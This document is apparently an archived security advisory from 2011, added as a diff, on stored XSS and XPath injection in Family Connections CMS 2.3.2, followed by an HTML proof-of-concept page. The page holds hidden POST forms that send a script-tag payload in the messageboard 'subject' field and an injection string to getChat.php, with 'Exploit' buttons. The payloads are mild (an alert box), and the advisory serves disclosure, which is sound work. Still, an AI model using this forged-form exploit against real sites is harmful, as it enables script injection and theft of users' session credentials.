@@ -1,0 +1,68 @@
+source: http://www.securityfocus.com/bid/47037/info
+
+Family Connections is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, or launch other attacks.
+
+Family Connections 2.3.2 is vulnerable; other versions may also be affected. 
+
+<!--
+
+
+Family Connections CMS 2.3.2 (POST) Stored XSS And XPath Injection
+
+
+Vendor: Ryan Haudenschilt
+Product web page: http://www.familycms.com
+Affected version: 2.3.2
+
+Summary: Family Connections is an open source
+content management system. It makes creating a
+private, family website easy and fun.
+
+Desc: FCMS suffers from a stored XSS vulnerability
+(post-auth) in messageboard.php script thru the
+&#039;subject&#039; post parameter. XPath lies in the
+/inc/getChat.php script with &#039;users&#039; get parameter with
+no args, and post parameter &#039;message&#039;.
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+
+Advisory ID: ZSL-2011-5004
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5004.php
+
+
+22.03.2011
+
+
+-->
+
+
+
+<html>
+<title>Family Connections CMS 2.3.2 Stored XSS And XPath Injection</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xpath(){document.forms["xpath"].submit();}
+function xss(){document.forms["xss"].submit();}
+</script>
+<form action="http://FCMS/inc/getChat.php" enctype="application/x-www-form-urlencoded" method="POST" id="xpath">
+<input type="hidden" name="message" value="\\&#039;;--\\&#34;;--" /></form>
+<a href="javascript: xpath();" style="text-decoration:none">
+<b><font color="red"><center><h3><br /><br />Exploit XPath!<h3></center></font></b></a>
+<form action="http://FCMS/messageboard.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="subject" value=&#039;"><script>alert(1)</script>&#039; />
+<input type="hidden" name="post" value="waddup" />
+<input type="hidden" name="name" value="1" />
+<input type="hidden" name="post_submit" value="Submit" /></form>
+<a href="javascript: xss();" style="text-decoration:none">
+<b><font color="red"><center><h3><br /><br />Exploit XSS!<h3></center></font></b></a>
+</body></html>
